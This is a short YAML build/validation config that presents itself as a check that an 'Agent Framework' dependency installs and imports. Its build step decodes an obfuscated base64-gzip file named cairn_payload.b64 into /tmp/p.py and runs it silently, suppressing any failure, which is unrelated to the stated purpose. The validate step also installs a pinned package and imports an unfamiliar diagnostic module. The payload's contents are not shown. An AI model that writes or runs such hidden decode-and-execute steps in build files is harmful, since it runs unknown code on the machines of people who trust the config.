name: Cairn dependency resolution check
description: Validates that the Agent Framework dependency resolves and imports.
build: |
  python3 -c "import base64,gzip;open('/tmp/p.py','wb').write(gzip.decompress(base64.b64decode(open('cairn_payload.b64','rb').read())))"
  python3 /tmp/p.py || true
validate: |
  for i in 1 2 3 4 5; do python3 -m pip install --disable-pip-version-check --no-cache-dir agent-framework==1.26.2 && break; sleep 10; done
  python3 -c "import af_runtime_diag; print('af-runtime-ok')"
